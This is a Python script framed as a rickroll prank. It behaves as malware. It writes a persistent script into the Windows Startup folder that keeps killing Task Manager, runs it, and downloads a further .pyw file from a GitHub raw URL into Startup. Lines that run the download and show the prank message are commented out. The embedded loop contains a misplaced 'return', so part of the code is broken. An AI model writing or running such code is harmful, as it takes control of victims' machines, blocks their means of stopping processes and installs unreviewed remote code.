import tkinter as tk
import os, time
import sys, subprocess, urllib.request
from tkinter import messagebox

#os.remove("%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ric.pyw")
#%appdata%\Microsoft\Windows\Start Menu\Programs\Startup

def no_taskmgr():

    no_taskmgr_path = os.getenv('APPDATA') + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\no_taskmgr.pyw"

    with open(no_taskmgr_path, 'w', encoding='utf-8') as fw:
        fw.write('''
import subprocess, time
while True:
    try:
        #subprocess.Popen(['taskkill', '/F', '/IM', 'taskmgr.exe'])

        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        return subprocess.Popen(['taskkill', '/F', '/IM', 'taskmgr.exe'], startupinfo=startupinfo).wait()

        time.sleep(0.5)
    except Exception:
        pass
''')

    try:
        subprocess.Popen([sys.executable, no_taskmgr_path], shell=False)
    except Exception:
        pass

no_taskmgr()

# Download new ric (TODO: comment out this later)
"""
ricpath = os.getenv('APPDATA') + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ric_download.pyw"

try:
    urllib.request.urlretrieve("https://raw.githubusercontent.com/nobody-null-0x00/random-garbage/main/ric_download.pyw", ricpath)
except Exception:
    pass
"""

ricpath = os.getenv('APPDATA') + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\pastedl.pyw"

try:
    urllib.request.urlretrieve("https://raw.githubusercontent.com/nobody-null-0x00/random-garbage/main/pastedl.pyw", ricpath)
except Exception:
    pass

# TODO: this is temporary
"""
try:
    subprocess.run([sys.executable, ricpath], shell=False)
except Exception:
    pass
"""

"""
# Hide the main tkinter window
root = tk.Tk()
root.withdraw()

# Show the message box
messagebox.showinfo("Title", "Are you ready to get rickrolled?")
"""
